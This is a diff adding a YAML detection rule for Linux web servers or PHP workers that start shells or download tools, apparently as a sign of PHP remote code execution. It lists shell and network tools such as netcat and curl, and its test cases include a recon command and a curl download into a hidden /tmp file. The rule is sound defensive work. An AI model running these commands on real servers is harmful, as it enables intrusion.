@@ -1,0 +1,47 @@
+id: DL-0063
+title: Web server or PHP worker starts a shell or download tool (Linux)
+description: >
+  Apache, nginx, PHP-FPM, php-cgi, FrankenPHP or LiteSpeed starting sh, bash, curl, wget,
+  netcat, Python or a recon command. This is the most direct sign that a remote code
+  execution bug or a web shell is being used, for example PHP2Shell (CVE-2026-109618 and
+  CVE-2026-109619), where the command runs as the web user (www-data) under the worker.
+attack: [T1190, T1059.004, T1505.003]
+tactic: initial-access
+severity: high
+logsource: process_creation
+detection:
+  web_parent:
+    parent.path|re: '/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|litespeed|lshttpd)$'
+  shell_or_tool:
+    process.path|re: '/(sh|bash|dash|zsh|ksh|busybox|nc|ncat|netcat|socat|curl|wget|python[0-9.]*|perl|ruby|id|whoami|uname|hostname|base64|chmod)$'
+  mail:
+    process.command_line|contains: [sendmail, /usr/sbin/exim, postdrop]
+  condition: web_parent and shell_or_tool and not mail
+false_positives:
+  - PHP mail() runs sh -c sendmail (excluded). Applications that shell out to ImageMagick, git or a converter through sh -c. Baseline them per host.
+triage:
+  - Read the full process tree under the worker. A reverse shell (DL-0064), a download into /tmp or /dev/shm, or id / uname right after a burst of PHP memory errors (DL-0066) points to exploitation.
+  - Before you restart PHP, capture the worker's memory and the Apache logs. A restart erases the evidence.
+  - Patch PHP (8.2.35, 8.3.36, 8.4.27, 8.5.12 or your vendor backport) and restart every worker.
+tests:
+  match:
+    - parent.path: /usr/sbin/apache2
+      process.path: /usr/bin/dash
+      process.name: dash
+      process.command_line: 'sh -c id;uname -a'
+    - parent.path: /usr/sbin/php-fpm8.3
+      process.path: /usr/bin/curl
+      process.name: curl
+      process.command_line: 'curl -s http://203.0.113.9/x -o /tmp/.x'
+  no_match:
+    - parent.path: /usr/sbin/apache2
+      process.path: /usr/bin/dash
+      process.name: dash
+      process.command_line: 'sh -c /usr/sbin/sendmail -t -i'
+    - parent.path: /usr/sbin/sshd
+      process.path: /usr/bin/bash
+      process.name: bash
+      process.command_line: '-bash'
+references:
+  - https://www.php.net/ChangeLog-8.php
+  - https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/
